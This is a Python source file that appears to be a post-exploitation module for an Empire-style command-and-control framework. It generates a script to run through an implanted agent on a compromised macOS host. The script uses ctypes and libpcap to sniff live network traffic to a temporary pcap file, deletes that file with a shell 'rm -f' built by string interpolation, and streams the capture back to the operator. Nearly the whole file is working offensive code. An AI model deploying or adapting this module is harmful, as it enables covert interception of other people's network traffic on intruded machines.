class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'PcapSniffer',
            'Author': ['Alex Rymdeko-Harvey', '@Killswitch-GUI'],
            'Description': 'This module will do a full network stack capture.',
            'Background' : False,
            'OutputExtension' : "pcap",
            'NeedsAdmin' : True,
            'OpsecSafe' : False,
            'RunOnDisk' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Imports' : ['ctypes','threading','sys','os','errno','base64'],
            'Comments': [
                'Using libpcap.dylib we can perform full pcap on a remote host.'
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CaptureInterface': {
                'Description'   :   'Set interface name ie. en0 (Auto resolve by default)',
                'Required'      :   False,
                'Value'         :   ''
            },
            'MaxPackets': {
                'Description'   :   'Set max packets to capture.',
                'Required'      :   True,
                'Value'         :   '100'
            },
            'SavePath': {
                'Description'   :   'Path of the  file to save',
                'Required'      :   True,
                'Value'         :   '/tmp/debug.pcap'
            },
            'PcapDylib': {
                'Description'   :   'Path of the Pcap Dylib (Defualt)',
                'Required'      :   True,
                'Value'         :   '/usr/lib/libpcap.A.dylib'
            },
            'LibcDylib': {
                'Description'   :   'Path of the std C Dylib (Defualt)',
                'Required'      :   True,
                'Value'         :   '/usr/lib/libSystem.B.dylib'
            },
            'Debug' : {
                'Description'   :   'Enable to get verbose message status (Dont enable OutputExtension for this).',
                'Required'      :   True,
                'Value'         :   'False'
            },
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = '\n'
        for item in self.info['Imports']:
            script += "import %s \n" % item
        savePath = self.options['SavePath']['Value']
        Debug = self.options['Debug']['Value']
        maxPackets = self.options['MaxPackets']['Value']
        libcPath = self.options['LibcDylib']['Value']
        pcapPath = self.options['PcapDylib']['Value']
        if self.options['CaptureInterface']['Value']:
            script += "INTERFACE = '%s' \n" % self.options['CaptureInterface']['Value']
        else:
            script += "INTERFACE = '' \n"
        script += "DEBUG = %s \n" % Debug
        script += "PCAP_FILENAME = '%s' \n" % savePath
        script += "PCAP_CAPTURE_COUNT = %s \n" % maxPackets
        script += "OSX_PCAP_DYLIB = '%s' \n" % pcapPath
        script += "OSX_LIBC_DYLIB = '%s' \n" % libcPath
        script += R"""
IN_MEMORY = False
PCAP_ERRBUF_SIZE = 256
packet_count_limit = ctypes.c_int(1)
timeout_limit = ctypes.c_int(1000) # In milliseconds 
err_buf = ctypes.create_string_buffer(PCAP_ERRBUF_SIZE)
class bpf_program(ctypes.Structure):
    _fields_ = [("bf_len", ctypes.c_int),("bf_insns", ctypes.c_void_p)]
class pcap_pkthdr(ctypes.Structure):
    _fields_ = [("tv_sec", ctypes.c_long), ("tv_usec", ctypes.c_long), ("caplen", ctypes.c_uint), ("len", ctypes.c_uint)]
class pcap_stat(ctypes.Structure):
    _fields_ = [("ps_recv",ctypes.c_uint), ("ps_drop",ctypes.c_uint), ("ps_ifdrop", ctypes.c_int)]
def pkthandler(pkthdr,packet):
    cp = pkthdr.contents.caplen
    if DEBUG:
        print "packet capture length: " + str(pkthdr.contents.caplen)
        print "packet tottal length: " + str(pkthdr.contents.len)
        print(pkthdr.contents.tv_sec,pkthdr.contents.caplen,pkthdr.contents.len)
        print packet.contents[:cp]
if DEBUG:
    print "-------------------------------------------"
libc = ctypes.CDLL(OSX_LIBC_DYLIB, use_errno=True)
if not libc:
    if DEBUG:
        print "Error loading C libary: %s" % errno.errorcode[ctypes.get_errno()]
if DEBUG:
    print "* C runtime libary loaded: %s" % OSX_LIBC_DYLIB
pcap = ctypes.CDLL(OSX_PCAP_DYLIB, use_errno=True)
if not pcap:
    if DEBUG:
        print "Error loading C libary: %s" % errno.errorcode[ctypes.get_errno()]
if DEBUG:
    print "* C runtime libary loaded: %s" % OSX_PCAP_DYLIB
    print "* C runtime handle at: %s" % pcap
    print "-------------------------------------------"
if not INTERFACE:
    pcap_lookupdev = pcap.pcap_lookupdev
    pcap_lookupdev.restype = ctypes.c_char_p
    INTERFACE = pcap.pcap_lookupdev()
if DEBUG:
    print "* Device handle at: %s" % INTERFACE
net = ctypes.c_uint()
mask = ctypes.c_uint()
pcap.pcap_lookupnet(INTERFACE,ctypes.byref(net),ctypes.byref(mask),err_buf)
if DEBUG:
    print "* Device IP to bind: %s" % net
    print "* Device net mask: %s" % mask
pcap_open_live = pcap.pcap_open_live
pcap_open_live.restype = ctypes.POINTER(ctypes.c_void_p)
pcap_create = pcap.pcap_create
pcap_create.restype = ctypes.c_void_p
pcap_handle = pcap.pcap_open_live(INTERFACE, 1024, packet_count_limit, timeout_limit, err_buf)
if DEBUG:
    print "* Live capture device handle at: %s" % pcap_handle 
pcap_can_set_rfmon = pcap.pcap_can_set_rfmon
pcap_can_set_rfmon.argtypes = [ctypes.c_void_p]
if (pcap_can_set_rfmon(pcap_handle) == 1):
    if DEBUG:
        print "* Can set interface in monitor mode"
pcap_pkthdr_p = ctypes.POINTER(pcap_pkthdr)()
packetdata = ctypes.POINTER(ctypes.c_ubyte*65536)()
if DEBUG:
    print "-------------------------------------------"
pcap_dump_open = pcap.pcap_dump_open
pcap_dump_open.restype = ctypes.POINTER(ctypes.c_void_p)
pcap_dumper_t = pcap.pcap_dump_open(pcap_handle,PCAP_FILENAME)
if DEBUG:
    print "* Pcap dump handle created: %s" % pcap_dumper_t 
    print "* Pcap data dump to file: %s" % (PCAP_FILENAME) 
    print "* Max Packets to capture: %s" % (PCAP_CAPTURE_COUNT)
    print "-------------------------------------------"
c = 0
while True:
    if (pcap.pcap_next_ex(pcap_handle, ctypes.byref(pcap_pkthdr_p), ctypes.byref(packetdata)) == 1):
        pcap.pcap_dump(pcap_dumper_t,pcap_pkthdr_p,packetdata)
        c += 1
    if c > PCAP_CAPTURE_COUNT:
        if DEBUG:
            print "* Max packet count reached!"
        break
if DEBUG:
    print "-------------------------------------------"
    print "* Pcap dump handle now freeing"
pcap.pcap_dump_close(pcap_dumper_t)
if DEBUG:
    print "* Device handle now closing"
if not (pcap.pcap_close(pcap_handle)):
    if DEBUG:
        print "* Device handle failed to close!"
if not IN_MEMORY:
    f = open(PCAP_FILENAME, 'rb')
    data = f.read()
    f.close()
    os.system('rm -f %s' % PCAP_FILENAME)
    sys.stdout.write(data)
"""
        return script